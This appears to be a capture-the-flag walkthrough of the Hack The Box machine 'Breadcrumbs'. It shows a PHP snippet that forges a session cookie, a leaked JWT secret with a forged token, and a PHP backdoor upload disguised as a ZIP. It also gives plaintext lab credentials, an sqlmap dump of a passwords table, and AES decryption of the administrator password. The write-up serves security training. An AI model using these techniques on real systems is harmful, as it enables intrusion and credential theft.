---
published: true
---
<img src="https://i.ibb.co/nCsMGX3/1.png" alt="1" border="0"> 

<P>Methodology</P>

<ul>
  <li>Enumeration by LFI</li>
  <li>Phpsessid and Jwt token forge</li>
  <li>unrestricted upload</li>
  <li>Database leak</li>
  <li>Binary file analysis</li>
  <li>Port forwarding</li>
  <li>Database dump with SQLMAP</li>
</ul>


<pre><span class="line">┌──(root💀m19o)-[~/HTB/Breadcrumbs]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.228</span></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)</span><br><span class="line">80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">3306/tcp  open  mysql?</span><br><span class="line">5040/tcp  open  unknown</span><br><span class="line">7680/tcp  open  pando-pub?</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=2/23%Time=6034FA27%P=x86_64-pc-linux-gnu%r(RP</span><br><span class="line">SF:CCheck,4A,<span class="string">"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.12'\x20is\x20not\x20a</span></span><br><span class="line"><span class="string">SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"</span>)%r(X11Probe</span><br><span class="line">SF:,4A,<span class="string">"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.12'\x20is\x20not\x20allowed</span></span><br><span class="line"><span class="string">SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"</span>);</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre>


<h1>Enumeration</h1>
<br>
<img src="https://i.ibb.co/pPJx49Z/2.png" alt="2" border="0">

<P>As a penetartion tester you should analyze the application to understand the functionality of it</P>
<p>So now let`s check what that button does.</p>

<img src="https://i.ibb.co/hgg9FsV/3.png" alt="3" border="0">

<p>From that page we can understand that the application is for reading books and that button checks for books with title and author name</p>
<p>Let`s see how does the application search for books</p>

<img src="https://i.ibb.co/WBJfXR3/4.png" alt="4" border="0">

<p>So i started to test the searching with random word, in my case i used test to understand the behavior</p>
<p>I got nothing from that, so i will start my proxy "Burpsuite" to intercept that request</p>

<img src="https://i.ibb.co/ggYZMgD/5.png" alt="5" border="0">

<p>After intercepting the request as you can see there is another parameter called "method" we couldn`t see before, now let`s change method value to 1</p>

<img src="https://i.ibb.co/2P0h2CK/6.png" alt="6" border="0">

<p>I managed to generate an error by changing the method value to 1</p>
<p>The first line error says there is a missing key in the array called book and the second line error says that file_get_content method can`t find the file, so what if we gave it a file to open ?</p>

<img src="https://i.ibb.co/KqTmg1h/paul.png" alt="paul" border="0">

<p>So now we got LFI , Files.php says that we need to get paul session to login</p>
<p>Let`s see how this application generates a cookie</p>

<img src="https://i.ibb.co/G7KQwy8/7.png" alt="7" border="0">

<p>So now we got the code that generates the cookie, let`s get paul`s cookie</p>


<pre><span class="line">$username="paul";</span><br><span class="line"></span><br><span class="line">$max =3;</span><br><span class="line"></span><br><span class="line">$seed = rand(0, $max);</span><br><span class="line"></span><br><span class="line">foreach (range(0, $max) as $seed) {</span><br><span class="line"></span><br><span class="line">$key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";</span><br><span class="line"></span><br><span class="line">$session_cookie = $username.md5($key);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">echo $session_cookie;</span>><br></pre>
<pre><span class="line">paul47200b180ccd6835d25d034eeb6e6390</span><br></pre>

<p>Now we got our cookie</p>
<p>Let`s change it and login</p>

<img src="https://i.ibb.co/R4s8R0c/admin-login.png" alt="admin-login" border="0">

<p>Now we got access</p>
<p>Let`s check all the tabs and see what we can get</p>

<img src="https://i.ibb.co/WF7Yx8w/upload.png" alt="upload" border="0">

<p>So i can upload now ! , Let`s check how it works</p>

<img src="https://i.ibb.co/pd6rCkN/token.png" alt="token" border="0">

<p>It says there is a key called token is missing, i need to generate a token , let`s see how we can have one.</p>


<img src="https://i.ibb.co/sgmRTzv/Login-php.png" alt="Login-php" border="0">

<p>As you can see login.php uses authController.php to validate , now let`s see authcontroller.php content.</p>

<img src="https://i.ibb.co/yWN6VGh/8.png" alt="8" border="0">

<p>Now i can generate our token</p>
<p>To generate a token we need payload and secret key as mentioned , out payload load is a Multidimensional Array , { "data" { "username" : "paul" } }</p> 

<pre><span class="line"><span class="variable">$secret_key</span> = <span class="string">'6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e'</span>;</span><br></pre>
<
<pre><span class="line"> Token= eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU</span><br></pre>

<img src="https://i.ibb.co/Kr0BGmk/generate-token.png" alt="generate-token" border="0">


<p>Let`s upload the backdoor</p>
<p>It accepts ZIP files only, so upload a zip file and change it`s content with PHP backdoor and change the tipe to PHP in the filename and in the end of the request too</p>

<img src="https://i.ibb.co/GpkHMMB/backdoor.png" alt="backdoor" border="0">

<br>
<p class="aligncenter">
<img src="https://media4.giphy.com/media/jUK46vMp51xjgoS0oL/giphy.gif" alt="Bingo" border="0" class="center">
</p>

<h1>Foothold</h1> 

<p>Let`s start enumeration from inside, Upload dir is "Portal/Uploads" you will find your backdoor there</p>

<img src="https://i.ibb.co/KDqCgKp/enumeration.png" alt="enumeration" border="0"> 

<p>There is an interesting fold name pizzaDeliveryUserData, let`s check it.</p>

<img src="https://i.ibb.co/tJgd4c7/users.png" alt="users" border="0">

<p>That`s juicy, All users data but it looks like that only one user is enabled, that user is juliette, let`s check that file.</p>

<img src="https://i.ibb.co/9tDr3Tq/juliette.png" alt="juliette" border="0">

<p>Got creds now !!</p> 

<img src="https://i.gifer.com/JQrj.gif" alt="creds" border="0">


<h1>User Flag</h1>

<img src="https://i.ibb.co/8bmgkhr/user.png" alt="user" border="0">

<p>Let`s continue enumeration</p> 

<img src="https://i.ibb.co/8bmgkhr/user.png" alt="user" border="0">

<p>Microsoft stickynote contains juciy info, let`s check it</p>

<img src="https://i.ibb.co/PmjZCPr/sqliite.png" alt="sqliite" border="0">

<p>Database files we need to open it on our machine to check it</p>
<p>You can download the files with more than way, use what you like</p>
<p>In my case i used SCP to get the files</p>

<h5>Usage : </h5>
<p>scp "file you want to download" user@0.0.0.0:path "Your ip and where you want to download it"</p>


<h1>Lateral Movment</h1>
<p>After downloading the files look What i got !</p>

<pre><span class="line">juliette: jUli901./())!</span><br><span class="line">development: fN3)sN5Ee@g</span><br><span class="line">administrator: [MOVED]</span><br></pre>

<img src="https://www.gifcen.com/wp-content/uploads/2021/04/wow-gif-6.gif" alt="sqliite" border="0">

<p>Laterl Movment DONE</p>

<img src="https://i.ibb.co/94mCRmj/laterl.png" alt="laterl" border="0">

<h1>Privilege Escalation</h1>

<p>What Development user have for?</p> 

<img src="https://i.ibb.co/wcS89yG/krypter-linux.png" alt="krypter-linux" border="0">

<p>I tried type ./Krypter_linux and that what it gave me</p>

<img src="https://i.ibb.co/Dt2th7T/Admin-PASS.png" alt="Admin-PASS" border="0">

<p>That`s looks like a SQL statement, we need SQLMAP NOW !!</p>
<img src="https://media.tenor.com/images/876add141e3362604965467cdece4f01/tenor.gif" alt="Admin-PASS" border="0">

<pre><span class="line">PS C:\Development&gt; curl <span class="string">'http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords'</span> -UseBasicParsing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">StatusCode        : 200                                                                                               </span><br><span class="line">StatusDescription : OK                                                                                                </span><br><span class="line">Content           : selectarray(1) {                                                                                  </span><br><span class="line">                      [0]=&gt;                                                                                           </span><br><span class="line">                      array(1) {                                                                                      </span><br><span class="line">                        [<span class="string">"aes_key"</span>]=&gt;                                                                                 </span><br><span class="line">                        string(16) <span class="string">"k19D193j.&lt;19391("</span>                                                                 </span><br><span class="line">                      }                                                                                               </span><br><span class="line">                    }                                                                                                 </span><br><span class="line">                                                                                                                      </span><br><span class="line">RawContent        : HTTP/1.1 200 OK                                                                                   </span><br><span class="line">                    Keep-Alive: timeout=5, max=100                                                                    </span><br><span class="line">                    Connection: Keep-Alive                                                                            </span><br><span class="line">                    Content-Length: 96                                                                                </span><br><span class="line">                    Content-Type: text/html; charset=UTF-8                                                            </span><br><span class="line">                    Date: Tue, 23 Feb 2021 19:24:09 GMT                                                               </span><br><span class="line">                    Server: Apache/2.4.46 (Win64) ...                                                                 </span><br><span class="line">Forms             :                                                                                                   </span><br><span class="line">Headers           : {[Keep-Alive, timeout=5, max=100], [Connection, Keep-Alive], [Content-Length, 96], [Content-Type, </span><br><span class="line">                    text/html; charset=UTF-8]...}                                                                     </span><br><span class="line">Images            : {}                                                                                                </span><br><span class="line">InputFields       : {}                                                                                                </span><br><span class="line">Links             : {}                                                                                                </span><br><span class="line">ParsedHtml        :                                                                                                   </span><br><span class="line">RawContentLength  : 96 </span><br></pre>

<p>To use SQLMAP we need to use port forwarding</p>
<p>In my case i used SSH</p>


<pre><span class="line">ssh -N -L 1234:127.0.0.1:1234 development@10.10.10.228</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/HTB/Breadcrumbs]</span><br><span class="line">└─<span class="comment"># curl 'http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords'</span></span><br><span class="line">selectarray(1) {</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(1) {</span><br><span class="line">    [<span class="string">"aes_key"</span>]=&gt;</span><br><span class="line">    string(16) <span class="string">"k19D193j.&lt;19391("</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre>

<p>Let`s ROLL</p>

<pre><span class="line">sqlmap -u http://127.0.0.1:1234/index.php\?method\=select\&amp;username\=administrator\&amp;table\=passwords --dump</span><br><span class="line"></span><br><span class="line">Database: bread</span><br><span class="line">Table: passwords</span><br><span class="line">[1 entry]</span><br><span class="line">+----+---------------+------------------+----------------------------------------------+</span><br><span class="line">| id | account       | aes_key          | password                                     |</span><br><span class="line">+----+---------------+------------------+----------------------------------------------+</span><br><span class="line">| 1  | Administrator | k19D193j.&lt;19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |</span><br><span class="line">+----+---------------+------------------+----------------------------------------------+</span><br></pre>

<p>Now we need to decrypt the password</p>
<p>So we need to use base64 decode and after that we need to use aes decrypt with the key we got</p>
<br>
<p>You can use this link to decrypt it</p>
<pre><span class="line">https://gchq.github.io/CyberChef/<span class="comment">#recipe=From_Base64('A-Za-z0-9%2B/%3D',false)AES_Decrypt(%7B'option':'Latin1','string':'k19D193j.%3C19391('%7D,%7B'option':'Hex','string':'0000000000000000000000000000000'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':'undefined'%7D)&amp;input=SDJkRnovak53dFNUV0RVUm90OUpCaFdNUDZYT2RtY3BncXZZSEczNVFLdz0</span></span><br></pre>

<h1>ROOT Flag</h1>

<img src="https://i.ibb.co/f4hcNBg/ROOT.png" alt="ROOT" border="0">



<img src="https://i.pinimg.com/originals/2a/10/bd/2a10bd126b2287247102dd88fd47ec7b.gif
" alt="ROOT" border="0">
